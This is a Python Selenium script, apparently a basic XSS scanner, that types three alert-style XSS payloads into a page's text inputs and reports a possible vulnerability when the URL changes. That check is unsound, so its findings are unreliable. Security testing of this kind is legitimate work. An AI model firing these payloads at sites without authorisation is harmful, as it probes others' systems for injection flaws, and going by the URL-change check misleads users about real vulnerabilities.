from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
from selenium.common.exceptions import StaleElementReferenceException

# Define XSS payloads to test
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=\"javascript:alert('XSS');\">",
    "<svg/onload=alert('XSS')>"
    # Add more payloads here
]

def find_and_fill_inputs(driver, payload):
    # Function to find and fill input elements with a payload
    def fill_inputs():
        input_elements = driver.find_elements(By.TAG_NAME, "input")
        for input_element in input_elements:
            input_type = input_element.get_attribute("type")
            if input_type in ["number", "email", "date"]:
                continue
            try:
                input_element.clear()
                input_element.send_keys(payload)
                input_element.send_keys(Keys.ENTER)
                time.sleep(1)  # Allow time for potential alert boxes to appear
            except Exception as e:
                print(f"Could not fill input box: {e}")

    # Retry mechanism for handling stale element reference
    attempts = 3
    for attempt in range(attempts):
        try:
            fill_inputs()
            break
        except StaleElementReferenceException:
            if attempt < attempts - 1:
                print("Stale element reference, retrying...")
                time.sleep(1)
            else:
                print("Failed after several attempts due to stale element reference.")

def test_xss_payloads(driver, url):
    try:
        driver.get(url)
        original_url = driver.current_url

        for payload in xss_payloads:
            find_and_fill_inputs(driver, payload)
            
            # Check if URL changes due to payload injection
            current_url = driver.current_url
            print(f"Payload: {payload}")
            print(f"Current URL: {current_url}")
            if current_url != original_url:
                print("Potential XSS vulnerability detected!")
                print("Original URL:", original_url)

    except Exception as e:
        print("Error occurred:", str(e))
